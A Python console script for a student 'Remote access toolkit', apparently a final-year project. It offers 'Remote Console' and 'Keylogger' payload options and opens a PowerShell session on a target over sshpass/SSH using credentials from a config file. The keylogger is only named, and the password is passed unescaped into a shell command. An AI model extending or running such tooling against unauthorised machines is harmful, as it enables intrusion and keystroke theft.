#!/usr/bin/python
#python console for RAT 
# Created by : Luke O'Sullivan

#imports
import os
from signal import pause
import sys
import getpass
from modules import *
from paramiko import SSHClient






#variable help menu
banner = """
 ___________    ____ .______         .______          ___   .___________.
|   ____\   \  /   / |   _  \        |   _  \        /   \  |           |
|  |__   \   \/   /  |  |_)  |       |  |_)  |      /  ^  \ `---|  |----`
|   __|   \_    _/   |   ___/        |      /      /  /_\  \    |  |     
|  |        |  |     |  |            |  |\  \----./  _____  \   |  |     
|__|        |__|     | _|            | _| `._____/__/     \__\  |__|

        [::] Remote access toolkit for Final Year Project [::]
        [::] Created by : Luke O'Sullivan [::]                                                                                                                                                                                
"""

help_menu = """
        Arguments:
            -t <ipaddress>   = Run rat on target ip address
            XXX.rat = configuration file to add to rat

        Example:
            python3 main.py -t 192.168.56.100
            python3 main.py -f luke.rat
"""
options_menu = """
        [*] Select A Number to select a Payload [*]

        Payloads:
            [0] Remote Console
            [1] Keylogger

"""

username = getpass.getuser()
header = f"{username}@rat $"

#Read config file
def read_config(config_file):
    configuration = {} #empty dictonary
    read_lines = open(config_file, "r").readlines() #"r" is open in read mode, function just reads line of the config file 
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRECTORY"] = read_lines[2].strip()

    return configuration

def os_detection():
    #Windows
    if os.name == "nt":
        return "w"
    #Other
    if os.name == "posix":
        return "L"
    
#connect rat to target
def connect(address, password):



   
    #REMOTLY CORRECT
    os.system(f"sshpass -p \"{password}\" ssh rat@{address} 'powershell'")
    #target = SSHClient()
    #target.connect(ipv4, username='rat', password=target_password)

#terminate programe
def exit():
    sys.exit()

#Command Line interface
def cli(arguments):
    #DISPLAY BANNER
    print(banner)

    #if arguments exsist
    if arguments:
        print(options_menu)
        option = input(f"{header}")
        try:
            configuration = read_config(sys.argv[1])
        except FileNotFoundError:
            print("[!!] File Does Not Exsist")
            exit()
        
        #get config info
        ipv4 = configuration.get("IPADDRESS")
        target_password = configuration.get("PASSWORD")
        working_dir = configuration.get("WORKINGDIRECTORY")

        if option == "0":
            connect(ipv4, target_password)
    # If arguments dont exsist
    else:
        print(help_menu)


#main code
def main():
    
    #check for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
        argument = "Please Include an IP address"
    else:
        arguments_exist = True
    cli(arguments_exist)

#runs main code
if __name__ =="__main__":
    main()